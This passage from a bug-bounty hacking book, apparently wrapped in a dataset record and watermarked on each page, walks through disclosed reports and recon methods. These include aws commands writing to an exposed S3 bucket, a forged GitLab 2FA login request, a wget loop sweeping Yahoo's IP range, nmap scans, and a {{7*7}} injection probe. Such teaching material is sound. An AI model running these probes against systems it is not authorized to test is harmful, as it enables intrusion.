read, write, and\nread/write. The write and read/write permissions meant that anyone\nwith an AWS account could modify files, even if that file was stored\nin a private bucket.\nWhile looking for bugs on the HackerOne website, I realized the\nplatform was serving user images from an S3 bucket named hackerone-\nprofile-photos. The bucket name gave me a clue to the naming\nconvention HackerOne was using for buckets. To learn more about\n312\nDownload from www.finelybook.com 7450911@qq.com\ncompromising S3 buckets, I started looking at previous reports of\nsimilar bugs. Unfortunately, the reports I found about misconfigured\nS3 buckets didn’t include how reporters found the buckets or how\nthey had validated their vulnerability. I searched for information on\nthe web instead and found two blog posts:\nhttps://community.rapid7.com/community/infosec/blog/2013/03/27/19\n51-open-s3-buckets/ and https://digi.ninja/projects/bucket_finder.php/.\nThe Rapid7 article details their approach to discovering publicly\nreadable S3 buckets using fuzzing. To do so, the team gathered a list\nof valid S3 bucket names and generated a wordlist of common\npermutations, like backup, images, files, media and so on. The two lists\ngave them thousands of bucket name combinations to test access to\nusing the AWS command line tools. The second blog post includes a\nscript called bucket_finder that accepts a word list of possible bucket\nnames and checks whether each bucket in the list exists. If the bucket\ndoes exist, it attempts to read the contents using the AWS command\nline tools.\nI created a list of potential bucket names for HackerOne, such as\nhackerone, hackerone.marketing, hackerone.attachments, hackerone.users,\nhackerone.files, and so on. I gave the list to the bucket_finder tool and it\nfound a few buckets, but none were publicly readable. However, I\nnoticed that the script didn’t test if they were publicly writeable. To\ntest that, I created and attempted to copy a text file to the first bucket I\nfound using the command aws s3 mv test.txt s3://hackerone.marketing. This\nresulted in the following:\nmove failed: ./test.txt to s3://hackerone.marketing/test.txt A client error\n(AccessDenied) occurred when calling the PutObject operation: Access Denied\nTrying the next one, aws s3 mv test.txt s3://hackerone.files, resulted in\n313\nDownload from www.finelybook.com 7450911@qq.com\nthis:\nmove: ./test.txt to s3://hackerone.files/test.txt\nSuccess! Next, I tried to delete the file using the command aws s3\nrm s3://hackerone.files/test.txt and received another success.\nI was able to write and delete files from a bucket. An attacker\ncould theoretically move a malicious file into that bucket so a\nHackerOne staff member might access it. As I was writing my report,\nI realized I couldn’t confirm that HackerOne owned the bucket\nbecause Amazon lets users register any bucket name. I wasn’t sure\nwhether to report without ownership confirmation, but I figured: what\nthe hell. Within hours, HackerOne confirmed the report, fixed it, and\ndiscovered other misconfigured buckets. To HackerOne’s credit, when\nit awarded the bounty, it factored in the additional buckets and\nincreased my payout.\nTakeaways\nHackerOne is an awesome team: the hacker-minded developers know\ncommon vulnerabilities to look out for. But even the best developer\ncan make mistakes. Don’t be intimidated and shy away from testing\nan application or feature. As you’re testing, focus on third-party tools\nthat are easily misconfigured. Additionally, if you find write-ups or\npublicly accessible reports about new concepts, try to understand how\nthose reporters discovered the vulnerability. In this case, doing so was\na matter of researching how people were finding and exploiting S3\nmisconfigurations.\nBYPASSING GITLAB TWO-FACTOR\n314\nDownload from www.finelybook.com 7450911@qq.com\nAUTHENTICATION\nDifficulty: Medium\nURL: N/A\nSource: https://hackerone.com/reports/128085/\nDate reported: April 3, 2016\nBounty paid: N/A\nTwo-factor authentication (2FA) is a security feature that adds a\nsecond step to website login processes. Traditionally, when logging\ninto a website, users only enter their username and password to be\nauthenticated. With 2FA, the site requires an additional authentication\nstep beyond a password. Commonly, sites will send an authorization\ncode via email, text, or an authenticator app that the user must enter\nafter they’ve submitted their username and password. These systems\ncan be tough to implement correctly and are good candidates for\napplication logic vulnerability testing.\nOn April 3, 2016, Jobert Abma found a vulnerability in GitLab. It\nallowed an attacker to log into a target’s account without knowing the\ntarget’s password when 2FA was enabled. Abma noticed that once a\nuser entered their username and password during the sign-in process, a\ncode would be sent to the user. Submitting the code to the site would\nresult in the following POST request:\nPOST /users/sign_in HTTP/1.1\nHost: 159.xxx.xxx.xxx\n--snip--\n----------1881604860\nContent-Disposition: form-data; name=\"user[otp_attempt]\"\n➊ 212421\n----------1881604860--\n315\nDownload from www.finelybook.com 7450911@qq.com\nThe POST request would include an OTP token ➊ that\nauthenticates the user for the second step of 2FA. An OTP token\nwould be generated only after the user has already entered their\nusername and password, but if an attacker attempted to log in to their\nown account, they could intercept the request using a tool like Burp\nand add a different username to the request. This would change the\naccount they were being logged in to. For example, the attacker could\nattempt to log in to the user account called john as follows:\nPOST /users/sign_in HTTP/1.1\nHost: 159.xxx.xxx.xxx\n--snip--\n----------1881604860\nContent-Disposition: form-data; name=\"user[otp_attempt]\"\n212421\n----------1881604860\n➊ Content-Disposition: form-data; name=\"user[login]\"\njohn\n----------1881604860--\nThe user[login] request tells the GitLab website that a user has\nattempted to log in with their username and password, even when the\nuser has not attempted to log in. The GitLab website would generate\nan OTP token for john regardless, which the attacker could guess and\nsubmit to the site. If the attacker guessed the correct OTP token, they\ncould log in without having ever known the password.\nOne caveat of this bug is that an attacker had to either know or\nguess a valid OTP token for the target. An OTP token changes every\n30 seconds and is only generated when a user is logging in or a\nuser[login] request is submitted. Exploiting this vulnerability would be\ndifficult. Nonetheless, GitLab confirmed and fixed the vulnerability\nwithin two days of the report.\n316\nDownload from www.finelybook.com 7450911@qq.com\nTakeaways\nTwo-factor authentication is a tricky system to get right. When you\nnotice a site is using it, be sure to test its functionalities, such as any\ntoken lifetimes, maximum number of attempts limitations, and so on.\nAlso, check whether expired tokens can be reused, the likelihood of\nguessing a token, and other token vulnerabilities. GitLab is an open\nsource application, and Abma likely found this issue by reviewing the\nsource code because he identified the error in the code for developers\nin his report. Nonetheless, watch for HTTP responses that reveal\nparameters you can potentially include in HTTP requests, like Abma\ndid.\nYAHOO! PHP INFO DISCLOSURE\nDifficulty: Medium\nURL: http://nc10.n9323.mail.ne1.yahoo.com/phpinfo.php/\nSource: https://blog.it-securityguard.com/bugbounty-yahoo-\nphpinfo-php-disclosure-2/\nDate reported: October 16, 2014\nBounty paid: N/A\nThis report wasn’t awarded a bounty like the others in this chapter.\nBut it demonstrates the importance of network scanning and\nautomation for finding application configuration vulnerabilities. In\nOctober 2014, Patrik Fehrenbach of HackerOne found a Yahoo!\nserver that returned the contents of the phpinfo function. The phpinfo\nfunction outputs information about the current state of PHP. This\ninformation includes compilation options and extensions, the version\nnumber, information about the server and environment, HTTP\n317\nDownload from www.finelybook.com 7450911@qq.com\nheaders, and so on. Because every system is set up differently, phpinfo\nis commonly used to check configuration settings and the predefined\nvariables available on a given system. This type of detailed\ninformation should not be publicly accessible on production systems,\nbecause it gives attackers significant insight into a target’s\ninfrastructure.\nAdditionally, although Fehrenbach didn’t mention this, note that\nphpinfo will include the contents of httponly cookies. If a domain has an\nXSS vulnerability and a URL disclosing the contents of phpinfo, an\nattacker could use the XSS to make an HTTP request to the URL.\nBecause the contents of phpinfo are disclosed, the attacker could steal\nthe httponly cookie. This exploit is possible because the malicious\nJavaScript could read the HTTP response body with the value, even\nthough it’s not permitted to read the cookie directly.\nTo discover this vulnerability, Fehrenbach pinged yahoo.com,\nwhich returned 98.138.253.109. He used the whois command line tool\non the IP, which returned the following record:\nNetRange: 98.136.0.0 - 98.139.255.255\nCIDR: 98.136.0.0/14\nOriginAS:\nNetName: A-YAHOO-US9\nNetHandle: NET-98-136-0-0-1\nParent: NET-98-0-0-0-0\nNetType: Direct Allocation\nRegDate: 2007-12-07\nUpdated: 2012-03-02\nRef: http://whois.arin.net/rest/net/NET-98-136-0-0-1\nThe first line confirms that Yahoo! owns a large block of IP\naddresses from 98.136.0.0 to 98.139.255.255 or 98.136.0.0/14, which\nis 260,000 unique IP addresses. That’s a lot of potential targets! Using\n318\nDownload from www.finelybook.com 7450911@qq.com\nthe following simple bash script, Fehrenbach searched for the IP\naddress’s phpinfo files:\n#!/bin/bash\n➊ for ipa in 98.13{6..9}.{0..255}.{0..255}; do\n➋ wget -t 1 -T 5 http://${ipa}/phpinfo.php; done &\nThe code at ➊ enters a for loop that iterates through all the possible\nnumbers for each range in each pair of braces. The first IP tested\nwould be 98.136.0.0, then 98.136.0.1, then 98.136.0.2, and so on\nthrough 98.139.255.255. Each IP address would be stored in the\nvariable ipa. The code at ➋ uses the wget command line tool to make a\nGET request to the IP address being tested by replacing ${ipa} with the\ncurrent value of the IP address in the for loop. The -t flag denotes the\nnumber of times the GET request should be retried when unsuccessful,\nwhich in this case is 1. The -T flag denotes the number of seconds to\nwait before considering the request to have timed out. Running his\nscript, Fehrenbach found the URL\nhttp://nc10.n9323.mail.ne1.yahoo.com had the phpinfo function\nenabled.\nTakeaways\nWhen you’re hacking, consider a company’s entire infrastructure fair\ngame unless you’re told it’s out of scope. Although this report didn’t\npay a bounty, you can employ similar techniques to find some\nsignificant payouts. Additionally, look for ways to automate your\ntesting. You’ll often need to write scripts or use tools to automate\nprocesses. For example, the 260,000 potential IP addresses\nFehrenbach found would have been impossible to test manually.\n319\nDownload from www.finelybook.com 7450911@qq.com\nHACKERONE HACKTIVITY VOTING\nDifficulty: Medium\nURL: https://hackerone.com/hacktivity/\nSource: https://hackerone.com/reports/137503/\nDate reported: May 10, 2016\nBounty paid: Swag\nAlthough this report technically didn’t uncover a security\nvulnerability, it’s a great example of how to use JavaScript files to\nfind new functionality to test. In the spring of 2016, HackerOne had\nbeen developing functionality to allow hackers to vote on reports. This\nfeature wasn’t enabled in the user interface and shouldn’t have been\navailable to use.\nHackerOne uses the React framework to render its website, so\nmuch of its functionality is defined in JavaScript. One common way\nof using React to build functionality is to enable UI elements based on\nresponses from the servers. For example, a site might enable admin-\nrelated functionality, such as a Delete button, based on whether the\nserver identifies a user as an administrator. But the server might not\nverify that an HTTP request invoked via the UI was made by a\nlegitimate administrator. According to the report, the hacker, apok,\ntested whether disabled UI elements could still be used to make HTTP\nrequests. The hacker modified HackerOne’s HTTP responses to\nchange any false value to true, likely using a proxy like Burp. Doing\nso revealed new UI buttons for voting on reports, which invoked POST\nrequests when clicked.\nOther ways of discovering hidden UI features would be to use the\nbrowser developer tools or a proxy like Burp to search for the word\n320\nDownload from www.finelybook.com 7450911@qq.com\nPOST within the JavaScript files to identify HTTP requests the site\nuses. Searching for URLs is an easy way to find new functionality\nwithout having to browse through the entire application. In this case,\nthe JavaScript file included the following:\nvote: function() {\nvar e = this;\na.ajax({\n➊ url: this.url() + \"/votes\",\nmethod: \"POST\",\ndatatype: \"json\",\nsuccess: function(t) {\nreturn e.set({\nvote_id: t.vote_id,\nvote_count: t.vote_count\n})\n}\n})\n},\nunvote: function() {\nvar e = this;\na.ajax({\n➋ url: this.url() + \"/votes\" + this.get(\"vote_id\"),\nmethod: \"DELETE\":,\ndatatype: \"json\",\nsuccess: function(t) {\nreturn e.set({\nvote_id: t.void 0,\nvote_count: t.vote_count\n})\n}\n})\n}\nAs you can see, there are two paths for the voting functionality\nthrough the two URLs at ➊ and ➋. At the time of this report, you\ncould perform POST requests to these URL endpoints. Then you could\n321\nDownload from www.finelybook.com 7450911@qq.com\nvote on the reports despite the functionality not being available or\ncomplete.\nTakeaways\nWhen a site relies on JavaScript, especially on frameworks like React,\nAngularJS, and so on, using JavaScript files is a great way to find\nmore areas of the application to test. Using JavaScript files can save\nyou time and might help you identify hidden endpoints. Use tools like\nhttps://github.com/nahamsec/JSParser to make tracking JavaScript\nfiles over time easier.\nACCESSING PORNHUB’S MEMCACHE\nINSTALLATION\nDifficulty: Medium\nURL: stage.pornhub.com\nSource: https://blog.zsec.uk/pwning-pornhub/\nDate reported: March 1, 2016\nBounty paid: $2,500\nIn March 2016, Andy Gill was working on the PornHub bug bounty\nprogram, which had a scope of *.pornhub.com domains. This meant\nall the site’s subdomains were in scope and eligible for a bounty.\nUsing a custom list of common subdomain names, Gill discovered 90\nPornHub subdomains.\nIt would have been time-consuming to visit all of these sites, so as\nFehrenbach did in the earlier example, Gill automated the process\nusing EyeWitness. EyeWitness captures screenshots of websites and\nprovides a report of open 80, 443, 8080, and 8443 ports (which are\n322\nDownload from www.finelybook.com 7450911@qq.com\ncommon HTTP and HTTPS ports). Networking and ports are beyond\nthe scope of this book, but by opening a port, the server can use\nsoftware to send and receive internet traffic.\nThis task didn’t reveal much, so Gill focused on\nstage.pornhub.com because staging and development servers are more\nlikely to be misconfigured. To begin, he used the command line tool\nnslookup to get the IP address of the site. This returned the following\nrecord:\nServer: 8.8.8.8\nAddress: 8.8.8.8#53\nNon-authoritative answer:\nName: stage.pornhub.com\n➊ Address: 31.192.117.70\nThe address is the notable value ➊ because it shows the IP address\nof stage.pornhub.com. Next, Gill used the tool Nmap to scan the\nserver for open ports using the command nmap -sV -p- 31.192.117.70 -oA\nstage__ph -T4.\nThe first flag (-sV) in the command enables version detection. If an\nopen port is found, Nmap attempts to determine what software is\nrunning on it. The –p- flag instructs Nmap to scan all 65,535 possible\nports (by default, Nmap only scans the most popular 1,000 ports).\nNext, the command lists the IP to scan: the IP of stage.pornhub.com\n(31.192.117.70) in this case. Then the flag -oA outputs the results of the\nscan as all three major output formats, which are normal, grepable,\nand XML. In addition, the command includes a base filename\nstage__ph for the output files. The final flag, -T4, makes Nmap run a bit\nfaster. The default value is 3: the value 1 is the slowest and 5 is the\nfastest setting. Slower scans can evade intrusion detection systems,\nand faster scans require more bandwidth and might be less accurate.\n323\nDownload from www.finelybook.com 7450911@qq.com\nWhen Gill ran the command, he received the following result:\nStarting Nmap 6.47 ( http://nmap.org ) at 2016-06-07 14:09 CEST\nNmap scan report for 31.192.117.70\nHost is up (0.017s latency).\nNot shown: 65532 closed ports\nPORT STATE SERVICE VERSION\n80/tcp open http nginx\n443/tcp open http nginx\n➊ 60893/tcp open memcache\nService detection performed. Please report any incorrect results at http://\nnmap.org/submit/.\nNmap done: 1 IP address (1 host up) scanned in 22.73 seconds\nThe key part of the report is that port 60893 is open and running\nwhat Nmap identifies as memcache ➊. Memcache is a caching service\nthat uses key-value pairs to store arbitrary data. Typically, it’s used to\nincrease the speed of websites by serving content faster through the\ncache.\nFinding this port open isn’t a vulnerability, but it’s definitely a red\nflag. The reason is that Memcache’s installation guides recommend\nmaking it publicly inaccessible as a security precaution. Gill then used\nthe command line utility Netcat to attempt a connection. He wasn’t\nprompted for authentication, which is an application configuration\nvulnerability, so Gill was able to run harmless stats and version\ncommands to confirm his access.\nThe severity of accessing a Memcache server depends on what\ninformation it’s caching and how an application is using that\ninformation.\nTakeaways\nSubdomains and broader network configurations represent great\n324\nDownload from www.finelybook.com 7450911@qq.com\npotential for hacking. If a program is including a broad scope or all\nsubdomains in its bug bounty program, you can enumerate\nsubdomains. As a result, you might find attack surfaces that others\nhaven’t tested. This is particularly helpful when you’re looking for\napplication configuration vulnerabilities. It’s worth your time to\nbecome familiar with tools like EyeWitness and Nmap, which can\nautomate enumeration for you.\nSUMMARY\nDiscovering application logic and configuration vulnerabilities\nrequires you to watch for opportunities to interact with an application\nin different ways. The Shopify and Twitter examples demonstrate this\nwell. Shopify wasn’t validating permissions during HTTP requests.\nSimilarly, Twitter omitted security checks on its mobile application.\nBoth involved testing the sites from different vantage points.\nAnother trick to locating logic and configuration vulnerabilities is\nto find the surface areas of an application you can explore. For\nexample, new functionality is a great entry point for these\nvulnerabilities. It always provides a good opportunity to find bugs in\ngeneral. New code presents the chance for you to test edge cases or\nthe new code’s interaction with existing functionality. You can also\ndelve into a site’s JavaScript source code to discover functional\nchanges that wouldn’t be visible in the site’s UI.\nHacking can be time-consuming, so it’s important to learn tools\nthat automate your work. Examples in this chapter included small\nbash scripts, Nmap, EyeWitness, and bucket_finder. You’ll find more\ntools in Appendix A.\n325"
  },
  {
    "input": "",
    "summary": "This chapter outlines a structured approach to bug hunting, emphasizing reconnaissance through sub",
    "output": "Download from www.finelybook.com 7450911@qq.com\n19\nFINDING YOUR OWN BUG\nBOUNTIES\nUnfortunately, there is no magical formula to hacking, and there are\ntoo many constantly evolving technologies for me to explain every\nmethod of finding a bug. Although this chapter won’t make you an\nelite hacking machine, it should teach you the patterns successful bug\nhunters follow. This chapter guides you through a basic approach to\nbegin hacking any application. It’s based on my experience\ninterviewing successful hackers, reading blogs, watching videos, and\nactually hacking.\nWhen you first start hacking, it’s best to define your success based\non the knowledge and experience you gain, rather than on the bugs\nyou find or money you earn. This is because if your goal is to find\nbugs on high-profile programs or to find as many bugs as you can or\nsimply to make money, you may be unsuccessful at first if you are\nbrand new to hacking. Very smart and accomplished hackers test\nmature programs, such as Uber, Shopify, Twitter, and Google, on a\ndaily basis, so there are far fewer bugs to find and it can be easy to get\n326\nDownload from www.finelybook.com 7450911@qq.com\ndiscouraged. If you focus on learning a new skill, recognizing\npatterns, and testing new technologies, you can stay positive about\nyour hacking during dry spells.\nRECONNAISSANCE\nBegin approaching any bug bounty program using some\nreconnaissance, or recon, to learn more about the application. As you\nknow from previous chapters, there’s a lot to consider when you’re\ntesting an application. Start by asking these and other basic questions:\nWhat’s the scope of the program? Is it *.<example>.com or just www.\n<example>.com?\nHow many subdomains does the company have?\nHow many IP addresses does the company own?\nWhat type of site is it? Software as a service? Open source?\nCollaborative? Paid or free?\nWhich technologies does it use? Which programming language is it coded\nin? Which database does it use? Which frameworks is it using?\nThese questions are only some of the considerations you need to\nthink about when you first start hacking. For the purposes of this\nchapter, let’s assume you’re testing an application with an open scope,\nlike *.<example>.com. Start with the tools you can run in the\nbackground so you can do other recon while you’re waiting for the\ntools’ results. You can run these tools from your computer, but you\nrisk companies like Akamai banning your IP address. Akamai is a\npopular web application firewall, so if it bans you, you might be\nunable to visit common sites.\nTo avoid a ban, I recommend spinning up a virtual private server\n327\nDownload from www.finelybook.com 7450911@qq.com\n(VPS) from a cloud-hosting provider that allows security testing from\nits systems. Be sure to research your cloud provider because some\ndon’t allow this type of testing (for example, at the time of this\nwriting, Amazon Web Services doesn’t allow security testing without\nexplicit permission).\nSubdomain Enumeration\nIf you’re testing on an open scope, you can begin your recon by\nfinding subdomains using your VPS. The more subdomains you find,\nthe more attack surface you’ll have. To do this, I recommend using the\nSubFinder tool, which is fast and written in the Go programming\nlanguage. SubFinder will pull in subdomain records for a site based on\na variety of sources, including certificate registrations, search engine\nresults, the Internet Archive Wayback Machine, and others.\nThe default enumeration that SubFinder conducts might not find all\nsubdomains. But subdomains associated with a specific SSL\ncertificate are easy to find because of certificate transparency logs that\nrecord registered SSL certificates. For example, if a site registers a\ncertificate for test.<example>.com, it’s likely that subdomain will\nexist, at least at the time of registration. But it’s possible for a site to\nregister a certificate for a wildcard subdomain (*.<example>.com). If\nthat’s the case, you might only be able to find some subdomains\nthrough brute-force guessing.\nConveniently, SubFinder can also help you brute-force subdomains\nusing a common word list. The security list GitHub repository\nSecLists, referenced in Appendix A, has lists of common subdomains.\nAlso, Jason Haddix has published a helpful list at\nhttps://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a05\n6/.\n328\nDownload from www.finelybook.com 7450911@qq.com\nIf you don’t want to use SubFinder and just want to browse SSL\ncertificates, crt.sh is a great reference to check whether wildcard\ncertificates have been registered. If you find a wildcard certificate, you\ncan search censys.io for the certificate hash. Usually, there’s even a\ndirect link to censys.io on crt.sh for each certificate.\nOnce you’ve finished enumerating subdomains for *.\n<example>.com, you can port scan and screenshot the sites you find.\nBefore moving on, also consider whether it makes sense to enumerate\nsubdomains of subdomains. For example, if you find that a site\nregisters an SSL certificate for *.corp.<example>.com, it’s likely\nyou’ll find more subdomains by enumerating that subdomain.\nPort Scanning\nAfter you’ve enumerated subdomains, you can start port scanning to\nidentify more attack surfaces, including running services. For\nexample, by port scanning Pornhub, Andy Gill found an exposed\nMemcache server, and earned $2,500, as discussed in Chapter 18.\nThe results of the port scan can also be indicative of a company’s\noverall security. For example, a company that has closed all ports\nexcept 80 and 443 (common web ports for hosting HTTP and HTTPS\nsites) is likely to be security conscious. But a company with lots of\nopen ports is likely the opposite and might have better potential for\nbounties.\nTwo common port-scanning tools are Nmap and Masscan. Nmap is\nan older tool and can be slow unless you know how to optimize it. But\nit’s great because you can give it a list of URLs and it will determine\nthe IP address to scan. It’s also modular, so you can include other\nchecks in your scan. For example, the script titled http-enum will\nperform file and directory brute-forcing. In contrast, Masscan is\n329\nDownload from www.finelybook.com 7450911@qq.com\nextremely fast and might be best when you have a list of IP addresses\nto scan. I use Masscan to search commonly open ports, such as 80,\n443, 8080, or 8443, and then combine the results with screenshotting\n(a topic I discuss in the next section).\nSome details to note when port scanning from a list of subdomains\nare the IP addresses those domains are resolved to. If all but one\nsubdomain resolves to a common IP address range (for example, IP\naddresses owned by AWS or Google Cloud Compute), it might be\nworthwhile to investigate the outlier. The different IP address might\nindicate a custom-built or third-party application that doesn’t share the\nsame level of security as the company’s core applications, which\nreside on the common IP address range. As described in Chapter 14,\nFrans Rosen and Rojan Rijal exploited third-party services when\ntaking over subdomains from Legal Robot and Uber.\nScreenshotting\nAs with port scanning, a good step to take once you have a list of\nsubdomains is to screenshot them. This is helpful because it gives you\na visual overview of the program’s scope. When you’re reviewing the\nscreenshots, there are some common patterns that may be indicative of\nvulnerabilities. First, look for common error messages from services\nknown to be associated with subdomain takeovers. As described in\nChapter 14, an application that relies on external services might\nchange over time, and the DNS records for it might have been left and\nforgotten. If an attacker can take over the service, that could have\nsignificant implications for the application and its users. Alternatively,\nthe screenshot might not reveal an error message but might still show\nthat the subdomain is relying on a third-party service.\nSecond, you can look for sensitive content. For example, if all the\n330\nDownload from www.finelybook.com 7450911@qq.com\nsubdomains found on *.corp.<example>.com return a 403 access\ndenied except one subdomain, which has a login to an unusual\nwebsite, investigate that unusual site because it might be\nimplementing custom behavior. Similarly, also watch out for\nadministrative login pages, default installation pages, and so on.\nThird, look for applications that don’t match ones that are typical\non other subdomains. For example, if there is only one PHP\napplication and all the other subdomains are Ruby on Rails\napplications, it may be worthwhile to focus on that one PHP\napplication because the company’s expertise seems to be in Rails. The\nimportance of applications found on subdomains can be difficult to\ndetermine until you become familiar with them, but they can lead to\ngreat bounties like the one Jasmin Landry found when he escalated his\nSSH access to a remote code execution, as described in Chapter 12.\nA few tools can help you screenshot sites. At the time of this\nwriting, I use HTTPScreenShot and Gowitness. HTTPScreenShot is\nhelpful for two reasons: first, you can use it with a list of IP addresses,\nand it will screenshot them and enumerate other subdomains\nassociated with SSL certificates it parses. Second, it will cluster your\nresults into groups based on whether the pages are 403 messages or\n500 messages, whether they use the same content management\nsystems, and other factors. The tool also includes the HTTP headers it\nfinds, which is also useful.\nGowitness is a fast, lightweight alternative for screenshotting. I use\nthis tool when I have a list of URLs instead of IP addresses. It also\nincludes the headers it receives when screenshotting.\nAlthough I don’t use it, Aquatone is another tool worth\nmentioning. At the time of this writing, it has recently been rewritten\nin Go and includes clustering, easy result outputting to match the\n331\nDownload from www.finelybook.com 7450911@qq.com\nformat required by other tools, and other features.\nContent Discovery\nOnce you’ve reviewed your subdomains and visual recon, you should\nlook for interesting content. You can approach the content discovery\nphase in a few different ways. One way is to attempt to discover files\nand directories by brute-forcing them. The success of this technique\ndepends on the word list you use; as mentioned earlier, SecLists\nprovides good lists, particularly the raft lists, which are the ones I use.\nYou can also track the results of this step over time to compile your\nown list of commonly found files.\nOnce you have a list of files and directory names, you have a few\ntools to choose from. I use Gobuster or Burp Suite Pro. Gobuster is a\ncustomizable and fast brute-forcing tool written in Go. When you give\nit a domain and word list, it tests for the existence of directories and\nfiles, and confirms the response from the server. Additionally, the\nMeg tool, developed by Tom Hudson and also written in Go, allows\nyou to test multiple paths on many hosts simultaneously. This is ideal\nwhen you’ve found a lot of subdomains and want to discover content\nacross all of them simultaneously.\nAs I’m using Burp Suite Pro to proxy my traffic, I’ll use either its\nbuilt-in content discovery tool or Burp Intruder. The content discovery\ntool is configurable and allows you to use a custom word list or the\nbuilt-in one, find file extension permutations, define how many nested\nfolders to brute-force, and more. When using Burp Intruder, on the\nother hand, I’ll send send a request for the domain I’m testing to\nIntruder and set the payload on the end of the root path. Then I’ll add\nmy list as the payload and run the attack. Typically, I’ll sort my results\nbased on content length or response status depending on how the\n332\nDownload from www.finelybook.com 7450911@qq.com\napplication responds. If I discover an interesting folder this way, I\nmight run Intruder again on that folder to discover nested files.\nWhen you need to go beyond file and directory brute-forcing,\nGoogle dorking, as described in the vulnerability Brett Buerhaus\nfound in Chapter 10, can also provide some interesting content\ndiscovery. Google dorking can save you time, particularly when you\nfind URL parameters that are commonly associated with\nvulnerabilities such as url, redirect_to, id, and so on. Exploit DB\nmaintains a database of Google dorks for specific use cases at\nhttps://www.exploit-db.com/google-hacking-database/.\nAnother approach to finding interesting content is to check the\ncompany’s GitHub. You might find open source repositories from the\ncompany or helpful information about the technologies it uses. This\nwas how Michiel Prins discovered the remote code execution on\nAlgolia, as discussed in Chapter 12. You can use the Gitrob tool to\ncrawl GitHub repositories for application secrets and other sensitive\ninformation. Additionally, you can review code repositories and find\nthird-party libraries an application is relying on. If you’re able to find\nan abandoned project or vulnerability in the third party that affects the\nsite, both could be worth a bug bounty. Code repositories can also\ngive you insight into how a company handled previous vulnerabilities,\nespecially for companies like GitLab that are open source.\nPrevious Bugs\nOne of the last steps of reconnaissance is to familiarize yourself with\nprevious bugs. Hacker write-ups, disclosed reports, CVEs, published\nexploits, and so on are good resources for this. As repeated throughout\nthis book, just because code is updated doesn’t mean all\nvulnerabilities have been fixed. Be sure to test any changes. When a\n333\nDownload from www.finelybook.com 7450911@qq.com\nfix is deployed, it means new code was added, and that new code\ncould contain bugs.\nThe $15,250 bug Tanner Emek found in Shopify Partners, as\ndescribed in Chapter 15, was the result of reading a previously\ndisclosed bug report and retesting the same functionality. As with\nEmek, when interesting or novel vulnerabilities are publicly disclosed,\nbe sure to read the report and visit the application. At worst, you\nwon’t find a vulnerability, but you’ll develop new skills while testing\nthat functionality. At best, you might bypass the developer’s fix or\nfind a new vulnerability.\nHaving covered all the major areas of reconnaissance, it’s time to\nmove on to testing the application. As you’re testing, keep in mind\nthat reconnaissance is an ongoing part of finding bug bounties. It’s\nalways a good idea to revisit a target application because it constantly\nevolves.\nTESTING THE APPLICATION\nThere’s no one-size-fits-all approach to testing an application. The\nmethodology and techniques you use depend on the type of\napplication you’re testing, similar to the way the program scope can\ndefine your recon. In this section, I’ll provide a general overview of\nthe considerations you need to bear in mind and the thought processes\nyou need to use when approaching a new site. But regardless of the\napplication you’re testing, there’s no better advice than Matthias\nKarlsson’s: “Don’t think ‘everyone else has looked, there’s nothing\nleft.’ Approach every target like nobody’s been there before. Don’t\nfind anything? Choose another one.”\n334\nDownload from www.finelybook.com 7450911@qq.com\nThe Technology Stack\nOne of the first tasks I do when testing a new application is identify\nthe technologies being used. This includes, but isn’t limited to,\nfrontend JavaScript frameworks, server-side application frameworks,\nthird-party services, locally hosted files, remote files, and so on. I\nusually do this by watching my web proxy history and noting the files\nserved, the domains captured in the history, whether HTML templates\nare served, any JSON content returned, and so on. The Firefox plug-in\nWappalyzer is also very handy for quickly fingerprinting\ntechnologies.\nWhile I’m doing this, I leave the default configuration for Burp\nSuite enabled and walk through the site to understand the functionality\nand note what design patterns developers have used. Doing so allows\nme to refine the types of payloads I’ll use in my testing, as Orange\nTsai did when he found the Flask RCE on Uber in Chapter 12. For\nexample, if a site uses AngularJS, test {{7*7}} to see whether 49 is\nrendered anywhere. If the application is built with ASP.NET with\nXSS protection enabled, you might want to focus on testing other\nvulnerability types first and check for XSS as a last resort.\nIf a site is built with Rails, you might know that URLs typically\nfollow a /CONTENT_TYPE/RECORD_ID pattern, where the RECORD_ID is\nan autoincremented integer. Using HackerOne as an example, report\nURLs follow the pattern www.hackerone.com/reports/12345. Rails\napplications commonly use integer IDs, so you might prioritize testing\ninsecure direct object reference vulnerabilities because this\nvulnerability type is easy for developers to overlook.\nIf an API returns JSON or XML, you might recognize that those\nAPI calls unintentionally return sensitive information that isn’t\n335\nDownload from www.finelybook.com 7450911@qq.com\nrendered on the page. Those calls might be a good testing surface and\ncould lead to information disclosure vulnerabilities.\nHere are some factors to keep in mind at this stage:\nContent formats a site expects or accepts For example, XML\nfiles come in different shapes and sizes, and XML parsing can\nalways be associated with XXE vulnerabilities. Keep an eye out\nfor sites that accept .docx, .xlsx, .pptx, or other XML file types.\nThird-party tools or services that are easily misconfigured\nWhenever you read reports about hackers exploiting such services,\ntry to understand how those reporters discovered the vulnerability\nand apply that process to your testing.\nEncoded parameters and how an application handles them\nOddities might be indicative of multiple services interacting in the\nbackend, which could be abused.\nCustom implemented authentication mechanisms, such as\nOAuth flows Subtle differences in how an application handles\nredirect URLs, encoding, and state parameters might lead to\nsignificant vulnerabilities.\nFunctionality Mapping\nOnce I understand a site’s technologies, I move on to functionality\nmapping. At this stage, I’m still browsing, but my testing can go one\nof a few ways here: I might look for markers of vulnerabilities, define\na specific goal for my testing, or follow a checklist.\nWhen I’m looking for markers of vulnerabilities, I look for\nbehavior commonly associated with vulnerabilities. For example, does\nthe site allow you to create webhooks with URLs? If so, this might\nlead to SSRF vulnerabilities. Does a site allow for user\n336\nDownload from www.finelybook.com 7450911@qq.com\nimpersonation? This could lead to sensitive personal information\nbeing disclosed. Can you upload files? How and where these files are\nrendered could lead to a remote code execution vulnerability, XSS,\nand so on. When I find something of interest, I stop and begin\napplication testing, as described in the next section, and look for some\nindication of a vulnerability. This might be an unexpected message\nreturned, a delay in response time, unsanitized input being returned, or\na server-side check being bypassed.\nIn contrast, when I define and work toward a goal, I decide what\nI’ll do before testing the application. The goal could be to find a\nserver-side request forgery, local file inclusion, remote code\nexecution, or some other vulnerability. Jobert Abma, a co-founder of\nHackerOne, commonly employs and advocates for this approach, and\nPhilippe Harewood used this method when he found his Facebook app\ntakeover. With this approach, you ignore all other possibilities and\nfocus entirely on your end goal. You only stop and begin testing if you\nfind something that leads to your goal. For example, if you’re looking\nfor a remote code execution vulnerability, unsanitized HTML returned\nin a response body wouldn’t be of interest.\nAnother testing approach is to follow a checklist. Both OWASP\nand Dafydd Stuttard’s Web Application Hacker’s Handbook provide\ncomprehensive testing checklists for reviewing an application, so\nthere’s no reason for me to try to 